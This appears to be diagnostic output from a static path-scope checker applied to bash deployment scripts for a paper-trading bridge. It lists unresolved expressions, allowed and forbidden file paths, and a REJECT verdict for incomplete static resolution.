UNRESOLVED line=1176 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${p0_pw_parts[$(( ${#p0_pw_parts[@]} expression=rc_record="${p0_pw_parts[$(( ${#p0_pw_parts[@]} - 1 ))]}"
UNRESOLVED line=1179 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${rc_record#P0_GETENT_RC=} expression=rc="${rc_record#P0_GETENT_RC=}"
UNRESOLVED line=1182 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${rc_record#P0_GETENT_RC=} expression=P0_PW_RC="$rc"
UNRESOLVED line=1191 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${p0_pw_parts[0]} expression=raw="${p0_pw_parts[0]}"
UNRESOLVED line=1192 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${p0_pw_parts[1]} expression=rc_record="${p0_pw_parts[1]}"
UNRESOLVED line=1194 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${rc_record#P0_GETENT_RC=} expression=rc="${rc_record#P0_GETENT_RC=}"
UNRESOLVED line=1200 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${rc_record#P0_GETENT_RC=} expression=P0_PW_RC="$rc"
UNRESOLVED line=1207 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${raw%$'\n'} expression=raw="${raw%$'\n'}"
UNRESOLVED line=1213 kind=coverage reason=assignment value is not statically known: unpinned variable P0_SAFE expression=P0_PW_DIAG="$P0_SAFE"
UNRESOLVED line=1220 kind=coverage reason=assignment value is not statically known: unpinned variable P0_SAFE expression=P0_PW_DIAG="$P0_SAFE"
UNRESOLVED line=1225 kind=coverage reason=assignment value is not statically known: unpinned variable P0_SAFE expression=P0_PW_DIAG="$P0_SAFE"
UNRESOLVED line=1232 kind=coverage reason=assignment value is not statically known: unpinned variable P0_COUNT expression=n_colon="$P0_COUNT"
UNRESOLVED line=1234 kind=coverage reason=assignment value is not statically known: unpinned variable P0_SAFE expression=P0_PW_DIAG="$P0_SAFE"
UNRESOLVED line=1237 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${raw#*:} expression=rest="${raw#*:}"
UNRESOLVED line=1237 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${raw%%:*} expression=f1="${raw%%:*}"
UNRESOLVED line=1238 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${rest#*:} expression=rest="${rest#*:}"
UNRESOLVED line=1238 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${rest%%:*} expression=f2="${rest%%:*}"
UNRESOLVED line=1239 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${rest#*:} expression=rest="${rest#*:}"
UNRESOLVED line=1239 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${rest%%:*} expression=f3="${rest%%:*}"
UNRESOLVED line=1240 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${rest#*:} expression=rest="${rest#*:}"
UNRESOLVED line=1240 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${rest%%:*} expression=f4="${rest%%:*}"
UNRESOLVED line=1241 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${rest#*:} expression=rest="${rest#*:}"
UNRESOLVED line=1241 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${rest%%:*} expression=f5="${rest%%:*}"
UNRESOLVED line=1242 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${rest#*:} expression=rest="${rest#*:}"
UNRESOLVED line=1242 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${rest%%:*} expression=f6="${rest%%:*}"
UNRESOLVED line=1243 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${rest#*:} expression=f7="$rest"
UNRESOLVED line=1245 kind=coverage reason=assignment value is not statically known: unpinned variable P0_SAFE expression=P0_PW_DIAG="$P0_SAFE"
UNRESOLVED line=1247 kind=coverage reason=assignment value is not statically known: unpinned variable P0_SAFE expression=P0_PW_DIAG="$P0_SAFE"
UNRESOLVED line=1248 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${raw%%:*} expression=P0_PW_NAME="$f1"
UNRESOLVED line=1248 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${rest%%:*} expression=P0_PW_GID="$f4"
UNRESOLVED line=1248 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${rest%%:*} expression=P0_PW_UID="$f3"
UNRESOLVED line=1249 kind=coverage reason=assignment value is not statically known: unpinned variable P0_SAFE expression=P0_PW_DIAG="$P0_SAFE"
UNRESOLVED line=1255 kind=coverage reason=assignment value is not statically known: unpinned variable P0_CAPTURE expression=live_uid="$P0_CAPTURE"
UNRESOLVED line=1256 kind=coverage reason=assignment value is not statically known: unpinned variable P0_CAPTURE expression=live_gid="$P0_CAPTURE"
UNRESOLVED line=1319 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=field="$1"
UNRESOLVED line=1319 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $2 expression=label="$2"
UNRESOLVED line=1319 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $3 expression=path="$3"
UNRESOLVED line=1319 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $4 expression=attested="$4"
UNRESOLVED line=1320 kind=coverage reason=assignment value is not statically known: command substitution expression=raw="$(LC_ALL=C "$P0_READLINK" -v -- "$path" 2>&1)"
UNRESOLVED line=1320 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $? expression=rc=$?
UNRESOLVED line=1320 kind=coverage reason=opaque command  has no registered argv grammar expression=
UNRESOLVED line=1320 kind=coverage reason=opaque command argument: unpinned variable path expression="$path"
UNRESOLVED line=1331 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${inner%\]} expression=inner="${inner%\]}"
UNRESOLVED line=1331 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${raw#*:\[} expression=inner="${raw#*:\[}"
UNRESOLVED line=1339 kind=coverage reason=assignment value is not statically known: command substitution expression=P0_NS_VALUE="$raw"
UNRESOLVED line=1346 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=field="$1"
UNRESOLVED line=1346 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $2 expression=path="$2"
UNRESOLVED line=1348 kind=coverage reason=assignment value is not statically known: command substitution expression=raw="$(LC_ALL=C "$P0_STAT" -L -c '%d' -- "$path" 2>&1)"
UNRESOLVED line=1348 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $? expression=rc=$?
UNRESOLVED line=1348 kind=coverage reason=opaque command  has no registered argv grammar expression=
UNRESOLVED line=1348 kind=coverage reason=opaque command argument: unpinned variable path expression="$path"
UNRESOLVED line=1357 kind=coverage reason=assignment value is not statically known: command substitution expression=P0_DEVICE="$raw"
UNRESOLVED line=1368 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=field="$1"
UNRESOLVED line=1368 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $2 expression=path="$2"
UNRESOLVED line=1368 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $3 expression=root_dev="$3"
UNRESOLVED line=1382 kind=coverage reason=assignment value is not statically known: unpinned variable P0_NS_VALUE expression=user="$P0_NS_VALUE"
UNRESOLVED line=1383 kind=coverage reason=assignment value is not statically known: unpinned variable P0_NS_VALUE expression=mnt="$P0_NS_VALUE"
UNRESOLVED line=1384 kind=coverage reason=assignment value is not statically known: unpinned variable P0_NS_VALUE expression=pid="$P0_NS_VALUE"
UNRESOLVED line=1385 kind=coverage reason=assignment value is not statically known: unpinned variable P0_NS_VALUE expression=net="$P0_NS_VALUE"
UNRESOLVED line=1386 kind=coverage reason=assignment value is not statically known: command substitution expression=root_canon="$(LC_ALL=C "$P0_READLINK" -v -f -- / 2>&1)"
UNRESOLVED line=1386 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $? expression=rc=$?
UNRESOLVED line=1386 kind=coverage reason=opaque command  has no registered argv grammar expression=
UNRESOLVED line=1386 kind=coverage reason=opaque command  may forward a path or endpoint expression=/
UNRESOLVED line=1394 kind=coverage reason=assignment value is not statically known: command substitution expression=root_id="$(LC_ALL=C "$P0_STAT" -L -c '%d:%i' -- / 2>&1)"
UNRESOLVED line=1394 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $? expression=rc=$?
UNRESOLVED line=1394 kind=coverage reason=opaque command  has no registered argv grammar expression=
UNRESOLVED line=1394 kind=coverage reason=opaque command  may forward a path or endpoint expression=/
UNRESOLVED line=1412 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${root_id%%:*} expression=root_dev="${root_id%%:*}"
UNRESOLVED line=1413 kind=coverage reason=assignment value is not statically known: unpinned variable P0_DEVICE expression=dev_user="$P0_DEVICE"
UNRESOLVED line=1414 kind=coverage reason=assignment value is not statically known: unpinned variable P0_DEVICE expression=dev_mnt="$P0_DEVICE"
UNRESOLVED line=1415 kind=coverage reason=assignment value is not statically known: unpinned variable P0_DEVICE expression=dev_pid="$P0_DEVICE"
UNRESOLVED line=1416 kind=coverage reason=assignment value is not statically known: unpinned variable P0_DEVICE expression=dev_net="$P0_DEVICE"
UNRESOLVED line=1472 kind=coverage reason=assignment value is not statically known: unpinned variable SECONDS expression=started="$SECONDS"
UNRESOLVED line=1473 kind=coverage reason=assignment value is not statically known: command substitution expression=raw="$(LC_ALL=C "$P0_ENV" -i LC_ALL=C "$P0_TIMEOUT" \
        --signal=TERM --kill-after="${P0_MANAGER_QUERY_KILL_AFTER_S}s" \
        "${P0_MANAGER_QUERY_BUDGET_S}s" \
        "$P0_SYSTEMCTL" --system --no-pager show --property=Version 2>&
UNRESOLVED line=1473 kind=coverage reason=opaque command  has no registered argv grammar expression=
UNRESOLVED line=1476 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $? expression=rc=$?
UNRESOLVED line=1477 kind=coverage reason=assignment value is not statically known: arithmetic expansion expression=elapsed=$(( SECONDS - started ))
UNRESOLVED line=1505 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${raw#Version=} expression=value="${raw#Version=}"
UNRESOLVED line=1548 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=p="$1"
UNRESOLVED line=1548 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $2 expression=raw="$2"
UNRESOLVED line=1559 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=p="$1"
UNRESOLVED line=1561 kind=coverage reason=assignment value is not statically known: command substitution expression=raw="$(LC_ALL=C "$P0_STAT" -c '%F' -- "$p" 2>&1)"
UNRESOLVED line=1561 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $? expression=rc=$?
UNRESOLVED line=1561 kind=coverage reason=opaque command  has no registered argv grammar expression=
UNRESOLVED line=1561 kind=coverage reason=opaque command argument: unpinned variable p expression="$p"
UNRESOLVED line=1586 kind=coverage reason=assignment value is not statically known: command substitution expression=sub="$(LC_ALL=C "$P0_STAT" -L -c '%F' -- "$p" 2>&1)"
UNRESOLVED line=1586 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $? expression=subrc=$?
UNRESOLVED line=1586 kind=coverage reason=opaque command  has no registered argv grammar expression=
UNRESOLVED line=1586 kind=coverage reason=opaque command argument: unpinned variable p expression="$p"
UNRESOLVED line=1644 kind=coverage reason=assignment value is not statically known: unpinned variable P0_COUNT expression=n_eacces="$P0_COUNT"
UNRESOLVED line=1645 kind=coverage reason=assignment value is not statically known: unpinned variable P0_COUNT expression=n_enoent="$P0_COUNT"
UNRESOLVED line=1646 kind=coverage reason=assignment value is not statically known: arithmetic expansion expression=classes=$(( n_eacces + n_enoent ))
UNRESOLVED line=1664 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=d="$1"
UNRESOLVED line=1673 kind=coverage reason=assignment value is not statically known: command substitution expression=canon="$(LC_ALL=C "$P0_READLINK" -v -f -- "$d" 2>&1)"
UNRESOLVED line=1673 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $? expression=rc=$?
UNRESOLVED line=1673 kind=coverage reason=opaque command  has no registered argv grammar expression=
UNRESOLVED line=1673 kind=coverage reason=opaque command argument: unpinned variable d expression="$d"
UNRESOLVED line=1710 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=py="$1"
UNRESOLVED line=1731 kind=unresolved_path reason=dynamic shell parameter $1 expression="$py"
UNRESOLVED line=1766 kind=coverage reason=assignment value is not statically known: command substitution expression=raw="$(LC_ALL=C "$P0_ENV" -i LC_ALL=C "$py" -I -S -c 'import sys
if not (sys.flags.isolated and sys.flags.no_site):
    sys.stdout.write("P0PY_STARTUP_UNPROVEN isolated=%d no_site=%d" % (sys.flags.isolated, sys.flags.no_site))
    raise Sys
UNRESOLVED line=1766 kind=coverage reason=opaque command  has no registered argv grammar expression=
UNRESOLVED line=1766 kind=coverage reason=opaque command argument: unpinned variable py expression="$py"
UNRESOLVED line=1770 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $? expression=rc=$?
UNRESOLVED line=1794 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${raw#P0PY } expression=version="${raw#P0PY }"
UNRESOLVED line=1799 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${version#*.} expression=minor="$rest"
UNRESOLVED line=1799 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${version#*.} expression=rest="${version#*.}"
UNRESOLVED line=1799 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${version%%.*} expression=major="${version%%.*}"
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== RP7-WPI-RO with real.constants ===
PATHSCOPE shell=RP7-WPI-RO.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=7 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=35 unresolved_endpoint_count=0 coverage_issue_count=337 provenance_issue_count=0 parse_issue_count=0
PATH value=/ verdict=FORBID rule=- sources=NONE uses=line=542:assignment prefix,line=679:assignment prefix,line=681:assignment prefix
PATH value=/opt/mtc-bridge/releases/2ce41e34bceb599d80af24c5c33d835820ec321b/IBKR_PAPER_BRIDGE/deploy/linux/verify_lock.py verdict=ALLOW-LEXICAL rule=/opt/mtc-bridge/releases/2ce41e34bceb599d80af24c5c33d835820ec321b/** sources=WPI_RELEASE_ROOT uses=line=1150:local assignment
PATH value=/opt/mtc-bridge/releases/2ce41e34bceb599d80af24c5c33d835820ec321b/IBKR_PAPER_BRIDGE/requirements.lock verdict=ALLOW-LEXICAL rule=/opt/mtc-bridge/releases/2ce41e34bceb599d80af24c5c33d835820ec321b/** sources=WPI_RELEASE_ROOT uses=line=1151:local assignment
PATH value=/opt/mtc-bridge/venvs/2ce41e34bceb599d80af24c5c33d835820ec321b/bin/python verdict=ALLOW-LEXICAL rule=/opt/mtc-bridge/venvs/2ce41e34bceb599d80af24c5c33d835820ec321b/** sources=WPI_VENV_ROOT uses=line=980:local assignment,line=999:test
PATH value=/opt/mtc-bridge/venvs/2ce41e34bceb599d80af24c5c33d835820ec321b/lib/python3.12/site-packages verdict=ALLOW-LEXICAL rule=/opt/mtc-bridge/venvs/2ce41e34bceb599d80af24c5c33d835820ec321b/** sources=WPI_VENV_ROOT uses=line=1034:local assignment,line=1152:local assignment
PATH value=/proc/self/mountinfo verdict=FORBID rule=- sources=NONE uses=line=633:redirection <
PATH value=/proc/uptime verdict=FORBID rule=- sources=NONE uses=line=232:redirection <
UNRESOLVED line=118 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=prefix="$1"
UNRESOLVED line=127 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $? expression=rc=$?
UNRESOLVED line=132 kind=coverage reason=opaque command wpi_on_err has no registered argv grammar expression=wpi_on_err
UNRESOLVED line=135 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${1-} expression=s="${1-}"
UNRESOLVED line=136 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${s//$'\r'/ } expression=s="${s//$'\r'/ }"
UNRESOLVED line=137 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${s//$'\n'/ } expression=s="${s//$'\n'/ }"
UNRESOLVED line=139 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${s:0:300} expression=WPI_SAFE="${s:0:300}"
UNRESOLVED line=143 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=name="$1"
UNRESOLVED line=143 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${2-} expression=value="${2-}"
UNRESOLVED line=148 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=name="$1"
UNRESOLVED line=148 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $3 expression=minimum="$3"
UNRESOLVED line=148 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${2-} expression=value="${2-}"
UNRESOLVED line=155 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=name="$1"
UNRESOLVED line=155 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${2-} expression=value="${2-}"
UNRESOLVED line=162 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=name="$1"
UNRESOLVED line=162 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${2-} expression=value="${2-}"
UNRESOLVED line=171 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=name="$1"
UNRESOLVED line=171 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $2 expression=observed="$2"
UNRESOLVED line=171 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $3 expression=expected="$3"
UNRESOLVED line=176 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=prefix="$1"
UNRESOLVED line=176 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $2 expression=path="$2"
UNRESOLVED line=176 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $3 expression=source="$3"
UNRESOLVED line=186 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=value="$1"
UNRESOLVED line=187 kind=coverage reason=assignment value is not statically known: arithmetic expansion expression=WPI_PROBE_SEQ=$(( WPI_PROBE_SEQ + 1 ))
UNRESOLVED line=188 kind=coverage reason=assignment value is not statically known: unpinned variable EV_DIR expression=leaf="$EV_DIR/ro.$(printf '%04d' "$WPI_PROBE_SEQ").suppressed_value.bin"
UNRESOLVED line=189 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_LEAF_FD expression=fd="$WPI_LEAF_FD"
UNRESOLVED line=190 kind=unresolved_path reason=unpinned variable WPI_LEAF_FD expression="$fd"
UNRESOLVED line=196 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=path="$1"
UNRESOLVED line=200 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_LINE expression=WPI_PATH_FIELD="path=[unrenderable] path_sha256=$WPI_LINE"
UNRESOLVED line=204 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=WPI_PATH_FIELD="path=$path"
UNRESOLVED line=211 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=prefix="$1"
UNRESOLVED line=211 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $2 expression=path="$2"
UNRESOLVED line=211 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $3 expression=source="$3"
UNRESOLVED line=219 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=map="$1"
UNRESOLVED line=219 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $2 expression=wanted="$2"
UNRESOLVED line=223 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${entry#*=} expression=found="${entry#*=}"
UNRESOLVED line=227 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${entry#*=} expression=WPI_LINE="$found"
UNRESOLVED line=234 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${BASH_REMATCH[1]} expression=whole="${BASH_REMATCH[1]}"
UNRESOLVED line=234 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${BASH_REMATCH[2]} expression=frac="${BASH_REMATCH[2]}"
UNRESOLVED line=235 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${BASH_REMATCH[2]} expression=frac="${frac}000"
UNRESOLVED line=235 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${frac:0:3} expression=frac="${frac:0:3}"
UNRESOLVED line=236 kind=coverage reason=assignment value is not statically known: arithmetic expansion expression=WPI_LINE=$(( 10#$whole * 1000 + 10#$frac ))
UNRESOLVED line=240 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=leaf="$1"
UNRESOLVED line=246 kind=unresolved_path reason=dynamic shell parameter $1 expression="$leaf"
UNRESOLVED line=263 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=leaf="$1"
UNRESOLVED line=268 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $? expression=rc=$?
UNRESOLVED line=268 kind=unresolved_path reason=dynamic shell parameter $1 expression="$leaf"
UNRESOLVED line=274 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=label="$1"
UNRESOLVED line=275 kind=coverage reason=assignment value is not statically known: arithmetic expansion expression=WPI_PROBE_SEQ=$(( WPI_PROBE_SEQ + 1 ))
UNRESOLVED line=276 kind=coverage reason=assignment value is not statically known: unpinned variable EV_DIR expression=WPI_READ_DIAG="$EV_DIR/ro.$(printf '%04d' "$WPI_PROBE_SEQ").$label.read.stderr"
UNRESOLVED line=277 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_LEAF_FD expression=WPI_READ_DIAG_FD="$WPI_LEAF_FD"
UNRESOLVED line=297 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=WPI_CAP_BIND_PREFIX="$1"
UNRESOLVED line=297 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $2 expression=WPI_CAP_BIND_REASON="$2"
UNRESOLVED line=301 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=label="$1"
UNRESOLVED line=303 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_CAP_BIND_PREFIX expression=bind_prefix="$WPI_CAP_BIND_PREFIX"
UNRESOLVED line=303 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_CAP_BIND_REASON expression=bind_reason="$WPI_CAP_BIND_REASON"
UNRESOLVED line=307 kind=coverage reason=assignment value is not statically known: arithmetic expansion expression=WPI_PROBE_SEQ=$(( WPI_PROBE_SEQ + 1 ))
UNRESOLVED line=308 kind=coverage reason=assignment value is not statically known: unpinned variable EV_DIR expression=WPI_CAP_OUT="$EV_DIR/ro.$(printf '%04d' "$WPI_PROBE_SEQ").$label.stdout"
UNRESOLVED line=309 kind=coverage reason=assignment value is not statically known: unpinned variable EV_DIR expression=WPI_CAP_ERR="$EV_DIR/ro.$(printf '%04d' "$WPI_PROBE_SEQ").$label.stderr"
UNRESOLVED line=310 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_LEAF_FD expression=ofd="$WPI_LEAF_FD"
UNRESOLVED line=311 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_LEAF_FD expression=efd="$WPI_LEAF_FD"
UNRESOLVED line=312 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_LINE expression=start="$WPI_LINE"
UNRESOLVED line=314 kind=unresolved_path reason=cd argument is not statically known: unpinned variable EV_DIR expression="$EV_DIR"
UNRESOLVED line=315 kind=coverage reason=exec argument is not statically known: unpinned variable WPI_ENV expression="$WPI_ENV"
UNRESOLVED line=317 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $? expression=rc=$?
UNRESOLVED line=317 kind=unresolved_path reason=unpinned variable WPI_LEAF_FD expression="$efd"
UNRESOLVED line=317 kind=unresolved_path reason=unpinned variable WPI_LEAF_FD expression="$ofd"
UNRESOLVED line=334 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $? expression=brc=$?
UNRESOLVED line=334 kind=unresolved_path reason=unpinned variable WPI_LEAF_FD expression=/dev/fd/"$ofd"
UNRESOLVED line=335 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $? expression=erc=$?
UNRESOLVED line=335 kind=unresolved_path reason=unpinned variable WPI_LEAF_FD expression=/dev/fd/"$efd"
UNRESOLVED line=342 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_LINE expression=end="$WPI_LINE"
UNRESOLVED line=343 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $? expression=WPI_CAP_RC="$rc"
UNRESOLVED line=344 kind=coverage reason=assignment value is not statically known: arithmetic expansion expression=WPI_CAP_ELAPSED_MS=$(( end - start ))
UNRESOLVED line=349 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=prefix="$1"
UNRESOLVED line=349 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $2 expression=reason="$2"
UNRESOLVED line=349 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $3 expression=file="$3"
UNRESOLVED line=350 kind=unresolved_path reason=dynamic shell parameter $3 expression="$file"
UNRESOLVED line=351 kind=unresolved_path reason=dynamic shell parameter $3 expression="$file"
UNRESOLVED line=394 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=prefix="$1"
UNRESOLVED line=394 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $2 expression=reason="$2"
UNRESOLVED line=394 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $3 expression=source="$3"
UNRESOLVED line=394 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $4 expression=fd="$4"
UNRESOLVED line=394 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $5 expression=diag="$5"
UNRESOLVED line=394 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $6 expression=dfd="$6"
UNRESOLVED line=396 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $? expression=rc=$?
UNRESOLVED line=396 kind=coverage reason=read option value is not statically known: dynamic shell parameter $4 expression="$fd"
UNRESOLVED line=396 kind=unresolved_path reason=dynamic shell parameter $6 expression="$dfd"
UNRESOLVED line=402 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${whole#*$'\n'} expression=extra="${whole#*$'\n'}"
UNRESOLVED line=402 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${whole%%$'\n'*} expression=first="${whole%%$'\n'*}"
UNRESOLVED line=413 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${whole%%$'\n'*} expression=WPI_LINE="$first"
UNRESOLVED line=417 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=prefix="$1"
UNRESOLVED line=417 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $2 expression=reason="$2"
UNRESOLVED line=417 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $3 expression=file="$3"
UNRESOLVED line=419 kind=unresolved_path reason=dynamic shell parameter $3 expression="$file"
UNRESOLVED line=429 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=prefix="$1"
UNRESOLVED line=429 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $2 expression=reason="$2"
UNRESOLVED line=429 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $3 expression=stream="$3"
UNRESOLVED line=431 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_CAP_OUT expression=WPI_CAP_FD_SOURCE="$WPI_CAP_OUT"
UNRESOLVED line=431 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_CAP_OUT_FD expression=WPI_CAP_FD="$WPI_CAP_OUT_FD"
UNRESOLVED line=432 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_CAP_ERR expression=WPI_CAP_FD_SOURCE="$WPI_CAP_ERR"
UNRESOLVED line=432 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_CAP_ERR_FD expression=WPI_CAP_FD="$WPI_CAP_ERR_FD"
UNRESOLVED line=446 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=prefix="$1"
UNRESOLVED line=446 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $2 expression=reason="$2"
UNRESOLVED line=446 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $3 expression=stream="$3"
UNRESOLVED line=447 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_CAP_FD expression=fd="$WPI_CAP_FD"
UNRESOLVED line=447 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_CAP_FD_SOURCE expression=source="$WPI_CAP_FD_SOURCE"
UNRESOLVED line=458 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=prefix="$1"
UNRESOLVED line=458 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $2 expression=reason="$2"
UNRESOLVED line=458 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $3 expression=stream="$3"
UNRESOLVED line=459 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_CAP_FD expression=fd="$WPI_CAP_FD"
UNRESOLVED line=459 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_CAP_FD_SOURCE expression=source="$WPI_CAP_FD_SOURCE"
UNRESOLVED line=460 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_READ_DIAG expression=diag="$WPI_READ_DIAG"
UNRESOLVED line=460 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_READ_DIAG_FD expression=dfd="$WPI_READ_DIAG_FD"
UNRESOLVED line=461 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $? expression=rc=$?
UNRESOLVED line=461 kind=coverage reason=read option value is not statically known: unpinned variable WPI_CAP_FD expression="$fd"
UNRESOLVED line=461 kind=unresolved_path reason=unpinned variable WPI_READ_DIAG_FD expression="$dfd"
UNRESOLVED line=474 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=prefix="$1"
